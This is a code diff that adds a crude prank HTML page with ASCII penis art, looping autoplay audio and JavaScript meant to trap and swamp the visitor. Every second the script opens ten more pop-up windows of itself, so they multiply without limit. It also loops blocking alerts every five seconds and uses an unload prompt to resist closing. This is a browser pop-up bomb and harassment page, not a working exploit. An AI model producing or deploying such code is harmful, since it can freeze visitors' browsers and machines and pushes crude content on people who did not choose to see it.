@@ -1,0 +1,109 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Double Penis!</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-size: 50px;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        h1 {
+            position: absolute;
+            top: 30%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: colorChange 2s infinite, float 5s ease-in-out infinite;
+            text-align: center;
+        }
+
+        .penis {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 25px;
+            text-align: center;
+            line-height: 1.5;
+        }
+
+        @keyframes colorChange {
+            0% { color: red; }
+            25% { color: yellow; }
+            50% { color: green; }
+            75% { color: blue; }
+            100% { color: purple; }
+        }
+
+        @keyframes float {
+            0% { transform: translate(0, 0); }
+            50% { transform: translate(100px, 100px); }
+            100% { transform: translate(-100px, -100px); }
+        }
+    </style>
+</head>
+<body>
+    <h1>Double Penis!</h1>
+
+    <!-- Text-based penis illustration using symbols -->
+    <div class="penis">
+        8=====D<br>
+        8=====D<br>
+    </div>
+
+    <audio autoplay loop>
+        <source src="laugh.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        // Function to create many pop-up windows covering the screen, with frequent intervals
+        function popUpStacked() {
+            for (let i = 0; i < 10; i++) { // Create 10 pop-ups at a time
+                let posX = Math.floor(Math.random() * screen.width); // Random horizontal position
+                let posY = Math.floor(Math.random() * screen.height); // Random vertical position
+                window.open(window.location.href, '_blank', `width=400,height=400,left=${posX},top=${posY}`);
+            }
+        }
+
+        // Trigger multiple pop-ups every 1 second
+        setInterval(popUpStacked, 1000);
+
+        // Annoying alert message loop
+        function annoyingAlerts() {
+            alert('Double Penis!');
+            setTimeout(annoyingAlerts, 5000);
+        }
+
+        annoyingAlerts();
+
+        // Preventing the window from being closed
+        window.onbeforeunload = function() {
+            return "You really want to leave? Don't you want to stay?";
+        };
+
+        // Make the title of the page blink
+        var originalTitle = document.title;
+        setInterval(function() {
+            document.title = document.title === originalTitle ? "Haha!" : originalTitle;
+        }, 1000);
+
+        // Randomly move the <h1> element around the screen
+        function moveH1() {
+            var h1 = document.querySelector('h1');
+            var x = Math.floor(Math.random() * (window.innerWidth - h1.clientWidth));
+            var y = Math.floor(Math.random() * (window.innerHeight - h1.clientHeight));
+            h1.style.left = x + 'px';
+            h1.style.top = y + 'px';
+        }
+        
+        setInterval(moveH1, 1000); // Move the h1 text every second
+    </script>
+</body>
+</html>
